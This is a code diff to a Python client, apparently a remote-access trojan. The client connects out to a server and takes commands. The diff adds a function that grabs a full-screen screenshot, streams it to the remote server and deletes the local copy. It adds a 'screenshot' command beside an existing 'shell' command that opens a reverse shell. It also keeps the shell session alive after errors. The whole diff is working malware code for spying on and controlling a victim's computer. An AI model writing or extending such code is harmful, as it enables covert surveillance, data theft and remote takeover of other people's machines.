@@ -4,7 +4,27 @@ import threading
 import sys
 import os
 import subprocess
+import secrets
+import mss
+import mss.tools
+import platform
 
+def screenshot(socket):
+    if platform.system() == 'Windows':
+        appdata = os.getenv('APPDATA')
+        screen_path = os.path.join(appdata, f"{secrets.token_hex(5)}.jpg")
+    else:
+        screen_path = f"/tmp/{secrets.token_hex(5)}.jpg"
+
+    with mss.mss() as sct:
+        screenshot = sct.grab(sct.monitors[0])
+        
+        mss.tools.to_png(screenshot.rgb, screenshot.size, output=screen_path)
+    with open(screen_path, 'rb') as f:
+            while (chunk := f.read(1024)):
+                socket.sendall(chunk)
+    socket.sendall("EOF".encode())
+    os.remove(screen_path)
 
 def reverse_shell(socket):
     while True:
@@ -21,28 +41,29 @@ def reverse_shell(socket):
         except subprocess.CalledProcessError as e:
             output = e.output
             socket.send(output.encode())
-            break
+            continue
         except Exception as e:
             output = str(e)
             socket.send(output.encode())
-            break
-        
+            continue
         socket.send(output.encode())
 
 
-def receive_messages(secure_sock):
+def receive_commands(secure_sock):
     while True:
         try:
-            message = secure_sock.recv(4096).decode()
-            if message == "shell":
-                print("GETTING SHELL")
+            command = secure_sock.recv(4096).decode()
+            if command == "shell":
+                print("SHELL")
                 reverse_shell(secure_sock)
-            elif not message:
+            elif command == "screenshot":
+                print("SCREENSHOT")
+                screenshot(secure_sock)
+            elif not command:
                 print("Connection closed by the server.")
                 break
-            print(message)
         except Exception as e:
-            print(f"Error receiving message: {e}")
+            print(f"Error receiving command: {e}")
             break
 
 
@@ -59,7 +80,7 @@ def connect_to_server(server_address, server_port):
         secure_sock.connect((server_address, server_port))
         print(secure_sock.recv(1024).decode())
 
-        receive_thread = threading.Thread(target=receive_messages, args=(secure_sock,))
+        receive_thread = threading.Thread(target=receive_commands, args=(secure_sock,))
 
         receive_thread.start()
 
